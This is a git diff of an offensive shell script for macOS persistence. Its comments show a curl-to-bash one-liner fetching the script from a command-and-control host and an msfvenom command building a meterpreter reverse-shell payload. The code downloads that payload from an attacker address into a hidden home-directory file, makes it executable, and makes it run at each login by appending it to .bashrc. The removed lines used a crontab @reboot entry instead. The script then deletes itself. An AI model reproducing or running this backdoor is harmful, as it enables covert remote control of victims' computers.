@@ -5,11 +5,11 @@
 # after shell popped to me i immediatemely ran this one liner to download and execute this script:
 # (you can change the namefile obv and hide .sh extension)
 #
-# curl -k -O https://MY_C2C_IP/osx_persistence/ | bash
+# curl -s -k https://MY_C2C_IP/osx_persistence/ | bash
 
-# Please remember that if you don't use file extensione, when downloading with curl or wget, problems
-# may occurs. So you need to put and ending slash / to file.
-URL="https://192.168.1.7/macho"
+# URL hosting our malicious mach-o reverse shell generated with msfvenom
+# msfvenom -p osx/x64/meterpreter_reverse_https LHOST=YOUR-IP LPORT=YOUR-PORT -f macho > macho
+URL="https://192.168.1.7:4443/macho"
 
 # Randomize payload name
 PAYLOAD=$RANDOM
@@ -22,17 +22,15 @@ PAYLOAD=".${PAYLOAD}"
 # or
 # Download from https
 # This payload is our persistence reverse backdoor in mach-o format!!!
-curl -k $URL -o /Applications/$PAYLOAD
+curl -k $URL -o ~/$PAYLOAD
 
 # Want to be sure that's my payload is executable
-chmod +x /Applications/$PAYLOAD
+chmod +x ~/$PAYLOAD
 
-# Persistence in crontab. Our backdoor will call us after 30 second of every reboot
-# If we kill session once established, victim neeeds to reboot to get again the shell
-crontab -l > temp_cron > /dev/null 2>&1
-echo "@reboot sleep 30; /Applications/$PAYLOAD 2>&1" >> temp_cron
-crontab temp_cron
-rm temp_cron
+# Persistence in .bashrc. Our backdoor will call us after user login.
+# If we kill session once established, victim neeeds to log off and log in again to get another shell,
+# or just reboot.
+echo "~/$PAYLOAD 2>&1" >> ~/.bashrc
 
 # Remove itself
 rm osx_persistence 2>&1
